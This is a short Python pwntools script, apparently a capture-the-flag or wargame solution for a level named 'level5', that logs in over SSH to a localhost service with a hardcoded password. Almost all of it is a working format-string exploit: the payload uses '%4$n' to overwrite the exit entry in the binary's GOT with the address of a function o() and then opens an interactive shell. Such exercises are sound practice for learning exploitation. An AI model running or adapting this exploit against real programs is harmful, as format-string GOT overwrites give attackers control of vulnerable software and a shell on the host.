#!/usr/bin/env python

from pwn import *

host = "127.0.0.1"
port = 4242

login = "level5" 
binary = login
password = "0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a" 
remotebinary = "/home/user/%s/%s" % (login, binary)

shell = ssh(host=host, port=port, user=login, password=password)


######  EXPLOIT  #####

o_addr_format = b"%134513824d"  # Address of o() in decimal -> in order to replace the address of exit in the GOT
got_exit = p32(0x08049838)
payload  = got_exit + o_addr_format + b"%4$n"

print("# Sending")
p = shell.process([remotebinary], env={})
p.sendline(payload)

# p.clean()

p.interactive()